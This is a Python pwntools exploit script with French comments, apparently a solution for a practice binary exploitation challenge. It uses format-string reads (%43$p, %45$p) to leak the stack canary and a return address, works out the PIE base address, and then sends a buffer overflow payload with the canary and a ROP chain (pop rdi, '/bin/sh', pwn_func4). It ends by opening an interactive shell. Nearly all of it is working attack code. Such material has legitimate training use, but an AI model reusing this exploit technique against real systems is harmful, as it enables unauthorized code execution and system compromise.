#!/usr/bin/env python3

import sys
import re
from pwn import *

# ICI LE PROBLEME EST QUE LE FLAG DE SECURITE PIE EST ACTIVE, DU COUP LA BASE ADRESSE EST RANDOMISER, MAIS TOUTES LES ADRESSES SONT TOUJOURS RELATIVE A CELLE-CI, SI NOUS RETROUVONS ET QUE NOUS METTONS A JOUR CETTE ADDRESS DANS PWNTOOLS, C EST COMME SI LE FLAG PIE EST DESACTIVE.

exe = sys.argv[1]


with open('/dev/null', 'wb') as err:
	io = process(exe, stderr=err)
	#gdb.attach(io.pid) #1/2 Permet de recuperer le printf parameter qui contient le canary  en manuel!
	#pause() #2/2

#	# FOUND LEAK IDX
#
#	for idx in range(1, 50):
#		cmd=b'prints %' + bytes(str(idx), 'ascii') + b'$p'
#		print(f"SEND >> {cmd}")
#		io.sendline(cmd)
#		io.recvuntil(b'Enter command: ')
#		io.send(b'exec\n')
#		out1=io.recvuntil(b'\n')
#		print(f">> RECV1 {out1}")

	#LEAK CANARY INFO
	cmd=b'prints %43$p'# recupere le canari a l endroit ou l on a recuperer manuellement le printf parameter plus haut
	print(f"SEND >> {cmd}")#print le canari
	io.sendline(cmd)#ecris le canari dans l input utilisateur
	io.recvuntil(b'Enter command: ')#recupere la main apres que le programme a print cette string !
	io.send(b'exec\n')
	out1=io.recvuntil(b'\n')
	print(f">> RECV1 {out1}")
	m=re.match(rb'.*0x(?P<canary>[a-f0-9]+)',out1)
	if m is None:
		raise RuntimeError(f'FAILED REGEX')
	canary_str = m.groupdict()["canary"]
	print(f"CANARY STR {canary_str}")
	#canary_bytes = bytes.fromhex(str(canary_str, 'ascii'))
	#print(f"CANARY BYTES {canary_bytes}")
	canary_int = int(canary_str.decode('ascii'), 16)
	print(f"CANARY INT {canary_int}")

	#LEAK ADDRESS

	cmd=b'prints %45$p'# recupere le canari a l endroit ou l on a recuperer manuellement le printf parameter plus haut
	print(f"SEND >> {cmd}")#print la retadr (save_rip)
	io.sendline(cmd)#ecris save_rip dans l input utilisateur
	io.recvuntil(b'Enter command: ')#recupere la main apres que le programme a print cette string !
	io.send(b'exec\n')
	out1=io.recvuntil(b'\n')
	print(f">> RECV1 {out1}")
	m=re.match(rb'.*0x(?P<retadr>[a-f0-9]+)',out1)
	if m is None:
		raise RuntimeError(f'FAILED REGEX')
	retadr_str = m.groupdict()["retadr"]
	print(f"RETADR STR {retadr_str}")
	retadr_int = int(retadr_str.decode('ascii'), 16)
	print(f"RETADR INT {retadr_int}")

	# COMPUTE ADDRESS
	exec_instructions = retadr_int - 264 # get by gdb # Address de la fonction exec_instructions en analyse dynamique
	elf = ELF(exe)
	raw_exec_instructions = elf.symbols['exec_instructions'] # Offset de la fonction exec_instructions en analyse statique
	base_addr = exec_instructions - raw_exec_instructions # Afin de remettre la base address au bonne endroit on fait le calcul:
	# (Adresse actuelle en dynamique avec potentiellement de la randomisation de la base address) - (offset de la fonction exec_instructions par rapport a la base address)
	print(f"BASE ADDR {base_addr}")
	elf.address = base_addr # Met a jour l address de base dans pwntools pour avoir les symbols, la got, les functions, la plt, la ropchain que j ai fait ou que je ferait, les gadgets etc...
	print(f"BASE ADDR {base_addr}")
	print(f"ELF BASE ADDR {elf.address}")


	pwnfunc4 = elf.symbols['pwn_func4']
	print(f"FUNC4 : {pwnfunc4:x}")
	context.clear(arch='x86_64')
	rop = ROP(elf)
	
	rdi = rop.rdi
	print(f"GADGET : {rdi}")

	payload = (b'prints '
		+ (b'\xff' * 264) #op1 #Regarder pk cet offset dans la video !# INDEX DU CANARY PAR RAPPORT A LA VARIABLE DE BASE SUR LEQUEL ON ECRIT ?
		#+ p64(int.from_bytes(canary_bytes, byteorder='big')) #CANARY
		+ p64(canary_int) #CANARY
		+ (b'\0' * 8) #RBP' (RBP PRIME)
		+ p64(rdi.address) #RIP -> POP RDI;RET #1/3 ROPCHAIN # POUR PLACER L ARGUMENT de pwn_func4 DANS RDI
		+ (b'/bin/sh$') #ARG -> RDI #2/3 ROPCHAIN # L'ARGUMENT QUE L ON VEUT METTRE DANS RDI POUR LA FONCTION pwn_func4
		+ p64(pwnfunc4) # RIP -> pwn_func4 #3/3 ROPCHAIN # L ADRESSE DE LA FONCTION pwn_func4 dans RIP
	)

	print(f"PAYLOAD: {payload}")


	io.sendline(payload)
#	for index in range(1, 50): # 1/2 Trouver le prontf parameter
#		io.sendline(b'prints %' + idx + '$p')#2/2
	io.sendline(payload)
	io.recvuntil(b'Enter command: ')
	io.send(b'exec\n')
	out1 = io.recvuntil(b'\n')
	print(f">> RECV! {out1}")
	if b'PWNED' in out1:
		io.interactive()
#	#out2 = io.recvuntil((b'Enter command: ', b'\n'))
#	#print(f">> RECV2 {out2}")




#ROOTED AT 39:59
